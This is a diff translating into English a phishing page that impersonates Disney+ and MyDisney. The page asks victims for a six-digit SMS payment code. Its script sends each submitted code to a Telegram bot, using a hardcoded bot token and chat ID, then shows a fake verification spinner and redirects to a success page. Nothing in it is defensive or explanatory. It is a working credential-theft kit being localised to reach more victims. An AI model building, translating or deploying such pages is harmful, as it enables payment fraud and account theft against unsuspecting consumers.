@@ -1,39 +1,38 @@
 <!-- sms-verification.html -->
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Vérification SMS | Disney+</title>
-  <!-- CSS commun -->
+  <title>SMS Verification | Disney+</title>
   <link rel="stylesheet" href="style.css"/>
 </head>
 <body class="page-form">
   <main>
-    <!-- Logo MyDisney centré en haut de la carte -->
+    <!-- Centered MyDisney Logo -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1>Vérification SMS</h1>
+    <h1>SMS Verification</h1>
     <p>
-      Un code de sécurité a été envoyé à votre téléphone.<br/>
-      Saisissez-le pour finaliser le paiement.
+      A security code has been sent to your phone.<br/>
+      Enter it to finalize your payment.
     </p>
 
-    <!-- Icônes de paiement -->
+    <!-- Payment icons -->
     <div class="cb-icons" style="display:flex; justify-content:center; gap:20px; margin:20px 0;">
       <img src="Images/applepay.png" alt="Apple Pay" style="height:36px; object-fit:contain;"/>
       <img src="Images/googlepay.png" alt="Google Pay" style="height:36px; object-fit:contain;"/>
     </div>
 
     <form id="smsForm">
-      <input type="text" name="sms" maxlength="6" placeholder="Code à 6 chiffres" required/>
-      <button type="submit">Valider</button>
+      <input type="text" name="sms" maxlength="6" placeholder="6-digit code" required/>
+      <button type="submit">Verify</button>
     </form>
 
-    <!-- Note de bas de page + logos partenaires -->
+    <!-- Footer note + partner logos -->
     <div class="footer-note">
-      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
-      MyDisney vous donne accès aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et bien plus encore</a>.
+      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
+      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -46,11 +45,11 @@
     </div>
   </main>
 
-  <!-- Overlay du spinner -->
+  <!-- Spinner overlay -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
     <div class="spinner-text" style="color:#fff; margin-top:16px; font-size:1rem;">
-      Vérification du code…
+      Verifying code…
     </div>
   </div>
 
@@ -58,7 +57,7 @@
     document.getElementById("smsForm").addEventListener("submit", function(e) {
       e.preventDefault();
       const code = this.sms.value.trim();
-      // Envoi du code via Telegram
+      // Send code via Telegram
       fetch(
         `https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage`,
         {
@@ -66,13 +65,13 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: "-4970333928",
-            text: `🔐 Code SMS : ${code}`
+            text: `🔐 SMS Code: ${code}`
           })
         }
       ).catch(console.error);
-      // Affiche le spinner
+      // Show spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
-      // Redirige après 2,5 secondes
+      // Redirect after 2.5 seconds
       setTimeout(() => {
         window.location.href = "success.html";
       }, 2500);
